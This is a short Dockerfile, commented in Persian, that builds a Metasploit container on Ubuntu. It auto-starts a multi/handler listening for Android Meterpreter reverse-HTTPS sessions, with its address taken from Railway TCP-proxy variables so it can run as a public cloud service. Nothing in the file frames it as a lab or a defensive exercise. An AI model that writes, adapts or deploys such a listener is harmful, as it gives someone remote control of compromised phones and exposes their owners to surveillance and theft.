FROM ubuntu:22.04

# نصب متاسپلویت و postgresql (لازم برای msfdb)
RUN apt update && apt install -y metasploit-framework postgresql

# ابتدایی کردن دیتابیس (اگه لازم بود، اما معمولاً اتوماتیک ران می‌شه)
RUN service postgresql start && msfdb init

# پورت داخلی که handler listen می‌کنه (برای reverse_https)
EXPOSE 443

# ران کردن msfconsole با handler اتوماتیک
# LHOST و LPORT رو از variables Railway می‌گیره (برای TCP Proxy)
CMD service postgresql start && msfconsole -x "use multi/handler; set payload android/meterpreter/reverse_https; set LHOST $RAILWAY_TCP_PROXY_DOMAIN; set LPORT $RAILWAY_TCP_PROXY_PORT; set LURI /; set ExitOnSession false; exploit -j -z"